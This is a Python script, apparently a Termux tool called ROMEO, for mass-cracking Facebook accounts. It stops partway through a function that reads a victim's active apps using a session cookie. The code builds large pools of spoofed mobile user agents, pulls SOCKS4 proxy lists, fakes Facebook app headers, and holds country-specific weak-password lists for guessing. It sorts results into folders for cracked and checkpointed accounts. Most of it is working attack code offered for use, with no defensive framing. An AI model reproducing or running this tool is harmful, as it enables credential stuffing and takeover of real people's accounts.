#!/usr/bin/python3 
#Coded by : Muhammad Younis
#Github : https://github.com/YounisXyz
#Facebook : www.facebook.com/xyzhackers
###---------------------[IMPORT MODULES]---------------------###
import datetime,mechanize,calendar,ipaddress,os,sys,time,json,random,re,string,platform,base64,platform,uuid,webbrowser,shutil,rich,marshal,requests,zlib,socket,base64,threading,hashlib
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep
from os import system
from time import localtime as lt
from os import system as cmd
from datetime import date
from datetime import datetime
from time import sleep as XYZTIME
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
ses=requests.Session()
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
try:
    import requests
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
from time import sleep as XYZTIME


###-----------------------[CREATE FOLDERS IN STORAGE]-----------------------###
try:os.mkdir('/sdcard/ROMEO')
except:pass
try:os.mkdir('/sdcard/ROMEO/OK')
except:pass
try:os.mkdir('/sdcard/ROMEO/CP')
except:pass
try:os.mkdir('/sdcard/ROMEO/2F')
except:pass


###-----------------------[TERMUX DISPLAY NME ON THE SESSION SITE]-----------------------###
sys.stdout.write('\x1b[1;35m\x1b]2; YOUNIS XYZ ðŸ™‚ðŸ’— \x07')



###---------------------[BASIC COLORS]---------------------###
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
P = '\033[0;97m' 
B = '\x1b[1;94m' 
R = '\033[1;91m' 
pink = '\x1b[38;5;205m' 
H = '\033[1;92m'
N = '\033[1;97m'    
Y = '\033[1;93m' 
F = '\033[1;96m'
G = '\x1b[1;95m'
Brown = "\x1b[38;5;208m" 
croosline = "\033[9;36m" 
Y2 = '\x1b[38;5;118m' #DeepGreen
colors = ["\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]


#-----------------------[LOOP]-----------------------#
loop = 0
cp = []
ok = []
twf = []
Display_info = []
Cp = []
Cookie = []
Apk = []
user=[]
ugen=[]



#-----------------------[MENU USERAGENTS]-----------------------#
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    os.system("clear")
    os.system("xdg-open https://youtube.com/@YounisXyz?si=6suFGNh5NMFyIHqn")
    print(f'{P}\n\tLOADING ....')
    



for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(3000):
    build_nokiax = ['JDQ39','JZO54K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice([ugent1, ugent2, ugent3])
    ugen.append(memekk)
    
for t in range(10000):
    aa='Mozilla/5.0 (Linux; Android 7.0; '
    b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
    c='Hisense F102) '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    

###----------[ UA-API ]---------- ###
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']  
def ua_api():
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
	chrome3 = str(random.randint(100, 300))
	chrome4 = str(random.randint(1000, 9000))
	fuck = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
	return fuck
	
	
def ua_validate():
	android = random.choice(['7.1.2','8.1.0'])
	build = "OPM2."+str(random.randint(111111,199999))+".006"
	chrome = str(random.randint(60,99))+".0."+str(random.randint(3300,3999))+"."+str(random.randint(75,99))
	browser = str(random.randint(35,99))+".1."+str(random.randint(2200,2900))+"."+str(random.randint(111111,199999))
	return ('Mozilla/5.0 (Linux; U; Android {}; Redmi 5A Build/{}.H1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 OPR/{}'.format(android, build, chrome, browser))

def ua_mfacebook():
	samsung = f"Mozilla/5.0 (Linux; Android {str(random.randint(7,12))}; SM-A105M Build/RP1A.{str(random.randint(111111,299999))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,99))}.0.{str(random.randint(4000,4900))}.{str(random.randint(75,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(400,490))}.0.0.30.97;]"
	mixx = f"Mozilla/5.0 (Linux; Android {str(random.randint(3,8))}.{str(random.randint(0,4))}.{str(random.randint(0,2))}; Micromax A065 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(30,99))}.0.0.0 Mobile Safari/537.36"
	asus = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(1,9))}.{str(random.randint(2,6))}.{str(random.randint(0,3))}; en-US; ASUS_T00I Build/KVT49L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(random.randint(7,12))}.4.5.{str(random.randint(1000,1900))} U3/0.8.0 Mobile Safari/534.30"
	xyzrandomagents = random.choice([samsung, mixx, asus])
	return xyzrandomagents

#-----------------------[IF U WANT TO ADD MANULA USERAGENTS FILE]-----------------------#   
def My_Agents():
    try:
        ua=open('xyzagents.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/YounisXyz/XyzServer/blob/main/xyzagents.txt').text
        ua=open('.xyzagents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n') 
        ua=open('.xyzagents.txt','r').read().splitlines()




#-----------------------[DEF JALAN]-----------------------#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0001)



###-----------------------[CREATOR INFO]-----------------------###
Developer = "Muhammad Younis" 
Github = "https://github.com/YounisXyz" 
Facebook = "https://www.facebook.com/xyzhackers" 
Version = "0.0.1" 
###-----------------------[CREATOR INFO]-----------------------###

###----[DISPLAY PASS LIST]----###
Pakistan = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. khan1122\n{N}[{R}3{N}]. i love you\n{N}[{R}4{N}]. khankhan\n{N}[{R}5{N}]. khan123\n{N}[{R}6{N}]. khan786\n{N}[{R}7{N}]. baloch"
India = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. free fire\n{N}[{R}3{N}]. freefire\n{N}[{R}4{N}]. i love you\n{N}[{R}5{N}]. 57272300\n{N}[{R}6{N}]. 59039200"
Bangladesh = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. free fire\n{N}[{R}3{N}]. freefire\n{N}[{R}4{N}]. i love you\n{N}[{R}5{N}]. Bangladesh\n{N}[{R}6{N}]. bangladesh"
Afghanistan = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. free fire\n{N}[{R}3{N}]. freefire\n{N}[{R}4{N}]. i love you\n{N}[{R}5{N}]. khankhan\n{N}[{R}6{N}]. khan123\n{N}[{R}7{N}]. khan1122\n{N}[{R}8{N}]. Afghan123\n{N}[{R}9{N}]. afghanistan\n{N}[{R}10{N}]. 100200\n{N}[{R}11{N}]. kabul123"




#-----------------------[MENU GETTING DEVICE INFORMATION]-----------------------#
hostname=socket.gethostname()
ipp=socket.gethostbyname(hostname)
ipinfo = requests.get('http://ip-api.com/json/')
z = json.loads(ipinfo.text)
regi = z['regionName']
network = z['isp']
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000) 
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

###---------[CURRENTLY TIME ZONE]-------###
def xyztime():
    now = datetime.now()
    hours = now.hour
    if 4 <= hours < 12:timenow = "Good Morning"
    elif 12 <= hours < 15:timenow = "Good Afternoon"
    elif 15 <= hours < 18:timenow = "Good Evening"
    else:timenow = "Good Night"
    return timenow
    
    
#_________[ DISPLAY MONTH /N/ YEAR ]______>>>
month = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
date = datetime.now().day
month = month[(str(datetime.now().month))]
year = datetime.now().year
date = (str(date)+' '+str(month)+' '+str(year))
day = datetime.now().strftime("%A")
days = datetime.now().day


###---------[IF WNAT TO SAFE CLONE WITH DATE]-------###
OK = 'OK-'+str(date)+'-'+str(month)+'-'+str(year)+'.txt'
CP = 'CP-'+str(date)+'-'+str(month)+'-'+str(year)+'.txt'
now = datetime.now()
hour = now.hour

now = datetime.now()
current = datetime.now()
year = current.year
month = current.month
day = current.day

ltx = int(lt()[3])
if ltx > 12:
    x = ltx-12
    tag = "PM"
else:
    x = ltx
    tag = "AM"





#_________[ DISPLAY TIME / LOOP TIME ]______>>>
			
def XYZTIME():
    import time
    a=time.localtime()
    hr=a.tm_hour
    mn=a.tm_min
    sc=a.tm_sec
    return ('{}:{}:{}'.format(hr,mn,sc))


#-----------------------[DEF CLEAR TERMINAL]-----------------------#    
def clear():
    os.system('clear')
    print(logo)




logo =f"""                      
{R} _______  _______  _______  _______  _______ 
{P}(  ____ )(  ___  )(       )(  ____ \(  ___  )
{H}| (    )|| (   ) || () () || (    \/| (   ) |
{P}| (____)|| |   | || || || || (__    | |   | |
|     __)| |   | || |(_)| ||  __)   | |   | |
{H}| (\ (   | |   | || |   | || (      | |   | |
{P}| ) \ \__| (___) || )   ( || (____/\| (___) |
{R}|/   \__/(_______)|/     \|(_______/(_______)
\t      {N}[{Brown} {xyztime()} {N}]
{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
{P}[{H}â€¢{P}] AUTHOR   : {Developer}
{P}[{H}â€¢{P}] GITHUB   : {Github}
{P}[{H}â€¢{P}] FACEBOOK : {Facebook}
{P}[{H}â€¢{P}] VERSION  : {Version}
{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}"""
def line():
	print(f"{P}{50 * 'â”€'}") 



#---------------------[APPLICATION CHECKER]---------------------#
def check_applications(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r{P}[{R}!{P}]. {Y}SORRY THERE IS NO ACTIVE APK{P}')
    else:
        print(f'\r%s[ðŸŽ®]. %sYOUR ACTIVE APPLICATIONS  DETAILS:'%(P,H))
        for i in range(len(game)):
